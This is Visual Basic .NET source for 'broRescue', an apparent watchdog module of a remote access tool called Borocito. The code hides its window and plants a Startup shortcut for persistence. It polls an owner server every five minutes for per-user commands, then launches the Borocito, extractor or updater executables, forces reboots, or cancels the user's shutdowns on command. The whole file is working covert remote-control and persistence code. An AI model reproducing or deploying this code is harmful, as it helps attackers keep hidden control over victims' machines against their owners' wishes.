Imports Microsoft.Win32
Public Class Init
    Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Dim UID As String
    Dim threadReader As Threading.Thread
    Dim lastCommand As String
    Dim HttpOwnerServer As String
    Dim NoShutdown As Boolean = False
    Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Try
            LoadRegedit()
            StartWithWindows()
            CheckForIllegalCrossThreadCalls = False
            threadReader = New Threading.Thread(AddressOf ReadingCommand)
            threadReader.Start()
            Me.Hide()
        Catch ex As Exception
            Console.WriteLine("[Init_Load@Init]Error: " & ex.Message)
        End Try
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub StartWithWindows()
        Try
            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\broRescue.lnk"
            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
                Dim WSHShell As Object = CreateObject("WScript.Shell")
                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
                Shortcut.IconLocation = Application.ExecutablePath & ",0"
                Shortcut.TargetPath = Application.ExecutablePath
                Shortcut.WindowStyle = 1
                Shortcut.Description = "Rescue software for Borocito"
                Shortcut.Save()
            End If
        Catch ex As Exception
            Console.WriteLine("[StartWithWindows@Init]Error: " & ex.Message)
        End Try
    End Sub

    Sub ReadingCommand()
        Try
            While True
                Dim LocalCommandFile As String = DIRCommons & "\[" & UID & "]broRescue.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                ReadCommand()
                Threading.Thread.Sleep(300000) '5 minutos
            End While
        Catch ex As Exception
            Console.WriteLine("[ReadingCommand@Init]Error: " & ex.Message)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            UID = regKey.GetValue("UID")
            HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
            RegisterInstance()
        Catch ex As Exception
            Console.WriteLine("[LoadRegedit@Init]Error: " & ex.Message)
            End
        End Try
    End Sub
    Sub RegisterInstance()
        Try
            Dim llaveReg As String = "SOFTWARE\\Borocito\\boro-get\\" & My.Application.Info.AssemblyName
            Dim registerKey As RegistryKey = Registry.CurrentUser.OpenSubKey(llaveReg, True)
            If registerKey IsNot Nothing Then
                registerKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
            End If
        Catch ex As Exception
            Console.WriteLine("[RegisterInstance@Init]Error: " & ex.Message)
        End Try
    End Sub
    Sub ReadCommand()
        Try
            Dim filePath As String = DIRCommons & "\[" & UID & "]broRescue.str"
            Dim commandOne As String = IO.File.ReadAllLines(filePath)(1).Split(">"c)(1).Trim()
            If commandOne <> Nothing Then
                If lastCommand <> commandOne Then
                    If commandOne.StartsWith("broRescue") Then
                        Try
                            If commandOne.Contains("Borocito") Then
                                Process.Start(DIRCommons & "\Borocito.exe")
                            ElseIf commandOne.Contains("Extractor") Then
                                Process.Start(DIRCommons & "\BorocitoExtractor.exe")
                            ElseIf commandOne.Contains("Updater") Then
                                Process.Start(DIRCommons & "\BorocitoUpdater.exe")
                            ElseIf commandOne.Contains("Restart") Then
                                Process.Start("shutdown.exe", "/r")
                            ElseIf commandOne.Contains("NoShutdown") Then
                                NoShutdown = True
                            ElseIf commandOne.Contains("YesShutdown") Then
                                NoShutdown = False
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[ReadCommand(0)@Init]Error: " & ex.Message)
                        End Try
                    End If
                    lastCommand = commandOne
                End If
            End If
        Catch ex As Exception
            Console.WriteLine("[ReadCommand@Init]Error: " & ex.Message)
        End Try
    End Sub

    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                Console.WriteLine("[SessionEvent]User is logging off!")
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                Console.WriteLine("[SessionEvent]System is shutting down!")
            Else
                Console.WriteLine("[SessionEvent]Something happend!")
            End If
            If NoShutdown Then
                Process.Start("shutdown.exe", "/a")
            End If
        Catch ex As Exception
            Console.WriteLine("[SessionEvent]Error: " & ex.Message)
        End Try
    End Sub
End Class